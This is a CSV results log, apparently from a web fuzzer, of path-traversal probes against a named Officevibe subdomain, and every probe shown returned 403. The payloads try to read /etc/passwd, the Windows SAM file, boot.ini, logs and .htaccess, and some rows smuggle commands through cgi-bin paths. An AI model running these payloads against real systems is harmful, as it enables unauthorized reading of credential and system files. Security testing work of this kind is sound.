FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
..%5cetc/passwd,https://enterpriseregistration.officevibe.com/..%5cetc/passwd,,3444,403,312,17,7,text/html; charset=us-ascii,28.317514ms,
../config.js,https://enterpriseregistration.officevibe.com/../config.js,,3723,403,312,17,7,text/html; charset=us-ascii,27.71655ms,
../../../etc/passwd,https://enterpriseregistration.officevibe.com/../../../etc/passwd,,7190,403,312,17,7,text/html; charset=us-ascii,27.696047ms,
./../../../../../../../../../etc/passw*,https://enterpriseregistration.officevibe.com/./../../../../../../../../../etc/passw*,,15139,403,312,17,7,text/html; charset=us-ascii,32.245898ms,
../../boot.ini,https://enterpriseregistration.officevibe.com/../../boot.ini,,15624,403,312,17,7,text/html; charset=us-ascii,29.261809ms,
../../../logs/error.log,https://enterpriseregistration.officevibe.com/../../../logs/error.log,,18451,403,312,17,7,text/html; charset=us-ascii,28.142573ms,
..///etc/passwd,https://enterpriseregistration.officevibe.com/..///etc/passwd,,19422,403,312,17,7,text/html; charset=us-ascii,27.830353ms,
file/../../../../../../../../etc,https://enterpriseregistration.officevibe.com/file/../../../../../../../../etc,,24603,403,312,17,7,text/html; charset=us-ascii,28.143382ms,
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://enterpriseregistration.officevibe.com/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,28158,403,312,17,7,text/html; charset=us-ascii,27.630711ms,
./../../../../../../../../../etc/*,https://enterpriseregistration.officevibe.com/./../../../../../../../../../etc/*,,29065,403,312,17,7,text/html; charset=us-ascii,27.912409ms,
PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://enterpriseregistration.officevibe.com/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,31774,403,312,17,7,text/html; charset=us-ascii,29.81849ms,
..%5c..%5c..%5c..%5c..%5cetc/passwd,https://enterpriseregistration.officevibe.com/..%5c..%5c..%5c..%5c..%5cetc/passwd,,33538,403,312,17,7,text/html; charset=us-ascii,31.661855ms,
ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,https://enterpriseregistration.officevibe.com/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,,33654,403,312,17,7,text/html; charset=us-ascii,27.764721ms,
cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,https://enterpriseregistration.officevibe.com/cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,,34140,403,312,17,7,text/html; charset=us-ascii,27.793714ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,https://enterpriseregistration.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,,36688,403,312,17,7,text/html; charset=us-ascii,29.557897ms,
../.pass,https://enterpriseregistration.officevibe.com/../.pass,,37462,403,312,17,7,text/html; charset=us-ascii,28.255637ms,
../.passwd,https://enterpriseregistration.officevibe.com/../.passwd,,37467,403,312,17,7,text/html; charset=us-ascii,28.997585ms,
info2www '(../../../../../../../bin/mail root </etc/passwd>,https://enterpriseregistration.officevibe.com/info2www '(../../../../../../../bin/mail root </etc/passwd>,,38767,403,312,17,7,text/html; charset=us-ascii,27.918739ms,
../../../../../logs/access.log,https://enterpriseregistration.officevibe.com/../../../../../logs/access.log,,38985,403,312,17,7,text/html; charset=us-ascii,28.179358ms,
"cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","https://enterpriseregistration.officevibe.com/cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,39476,403,312,17,7,text/html; charset=us-ascii,27.719884ms,
../../apache/logs/error.log,https://enterpriseregistration.officevibe.com/../../apache/logs/error.log,,40906,403,312,17,7,text/html; charset=us-ascii,28.531032ms,
../../../logs/access.log,https://enterpriseregistration.officevibe.com/../../../logs/access.log,,45696,403,312,17,7,text/html; charset=us-ascii,27.889009ms,
../../logs/access.log,https://enterpriseregistration.officevibe.com/../../logs/access.log,,50318,403,312,17,7,text/html; charset=us-ascii,28.344132ms,
../../../../../logs/error.log,https://enterpriseregistration.officevibe.com/../../../../../logs/error.log,,51110,403,312,17,7,text/html; charset=us-ascii,28.693588ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://enterpriseregistration.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,52401,403,312,17,7,text/html; charset=us-ascii,27.777012ms,
..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,https://enterpriseregistration.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,,52408,403,312,17,7,text/html; charset=us-ascii,28.402466ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,https://enterpriseregistration.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,,53350,403,312,17,7,text/html; charset=us-ascii,28.521236ms,
cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://enterpriseregistration.officevibe.com/cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,53439,403,312,17,7,text/html; charset=us-ascii,33.24614ms,
static/..%5c..%5cetc/passwd,https://enterpriseregistration.officevibe.com/static/..%5c..%5cetc/passwd,,54184,403,312,17,7,text/html; charset=us-ascii,27.450213ms,
..//etc/passwd;index.html,https://enterpriseregistration.officevibe.com/..//etc/passwd;index.html,,55856,403,312,17,7,text/html; charset=us-ascii,27.640271ms,
css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://enterpriseregistration.officevibe.com/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,56912,403,312,17,7,text/html; charset=us-ascii,28.494229ms,
..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://enterpriseregistration.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,57302,403,312,17,7,text/html; charset=us-ascii,30.833692ms,
cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,https://enterpriseregistration.officevibe.com/cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,57730,403,312,17,7,text/html; charset=us-ascii,27.541722ms,
//../../data/config/microsrv.cfg,https://enterpriseregistration.officevibe.com///../../data/config/microsrv.cfg,,63058,403,312,17,7,text/html; charset=us-ascii,27.497383ms,
../../apache/logs/access.log,https://enterpriseregistration.officevibe.com/../../apache/logs/access.log,,65127,403,312,17,7,text/html; charset=us-ascii,27.801822ms,
..\\..\\..\\..\\..\\..\\..\\boot.ini,https://enterpriseregistration.officevibe.com/..\\..\\..\\..\\..\\..\\..\\boot.ini,,65982,403,312,17,7,text/html; charset=us-ascii,31.323695ms,
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://enterpriseregistration.officevibe.com/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,67936,403,312,17,7,text/html; charset=us-ascii,27.928728ms,
static/..%5c..%5c..%5cetc/passwd,https://enterpriseregistration.officevibe.com/static/..%5c..%5c..%5cetc/passwd,,70464,403,312,17,7,text/html; charset=us-ascii,34.727401ms,
../webserver.ini,https://enterpriseregistration.officevibe.com/../webserver.ini,,73462,403,312,17,7,text/html; charset=us-ascii,27.930536ms,
xyz/../../ThinVnc.ini,https://enterpriseregistration.officevibe.com/xyz/../../ThinVnc.ini,,74299,403,312,17,7,text/html; charset=us-ascii,32.46643ms,
static/../../../a/../../../../etc/passwd,https://enterpriseregistration.officevibe.com/static/../../../a/../../../../etc/passwd,,74451,403,312,17,7,text/html; charset=us-ascii,28.629919ms,
static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://enterpriseregistration.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,77730,403,312,17,7,text/html; charset=us-ascii,28.580451ms,
..%5c..%5c..%5c..%5cetc/passwd,https://enterpriseregistration.officevibe.com/..%5c..%5c..%5c..%5cetc/passwd,,78884,403,312,17,7,text/html; charset=us-ascii,30.545084ms,
../../logs/error.log,https://enterpriseregistration.officevibe.com/../../logs/error.log,,84935,403,312,17,7,text/html; charset=us-ascii,27.975869ms,
static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://enterpriseregistration.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,88703,403,312,17,7,text/html; charset=us-ascii,28.314231ms,
static/../../../../windows/win.ini.,https://enterpriseregistration.officevibe.com/static/../../../../windows/win.ini.,,88730,403,312,17,7,text/html; charset=us-ascii,28.241552ms,
..//..///etc/passwd,https://enterpriseregistration.officevibe.com/..//..///etc/passwd,,89982,403,312,17,7,text/html; charset=us-ascii,28.721656ms,
..\..\..\..\..\..\temp\temp.class,https://enterpriseregistration.officevibe.com/..\..\..\..\..\..\temp\temp.class,,91616,403,312,17,7,text/html; charset=us-ascii,27.943769ms,
../manager/text,https://enterpriseregistration.officevibe.com/../manager/text,,91797,403,312,17,7,text/html; charset=us-ascii,28.135413ms,
..%5c..%5cetc/passwd,https://enterpriseregistration.officevibe.com/..%5c..%5cetc/passwd,,93430,403,312,17,7,text/html; charset=us-ascii,27.766228ms,
../../../../apache/logs/error.log,https://enterpriseregistration.officevibe.com/../../../../apache/logs/error.log,,93634,403,312,17,7,text/html; charset=us-ascii,27.590597ms,
..////etc/passwd,https://enterpriseregistration.officevibe.com/..////etc/passwd,,94975,403,312,17,7,text/html; charset=us-ascii,28.288934ms,
../../../../../../../../../../WINNT/system32/ipconfig.exe,https://enterpriseregistration.officevibe.com/../../../../../../../../../../WINNT/system32/ipconfig.exe,,95676,403,312,17,7,text/html; charset=us-ascii,31.370304ms,
.//..///etc/passwd,https://enterpriseregistration.officevibe.com/.//..///etc/passwd,,96809,403,312,17,7,text/html; charset=us-ascii,37.799373ms,
../../../.htaccess,https://enterpriseregistration.officevibe.com/../../../.htaccess,,98837,403,312,17,7,text/html; charset=us-ascii,27.682327ms,
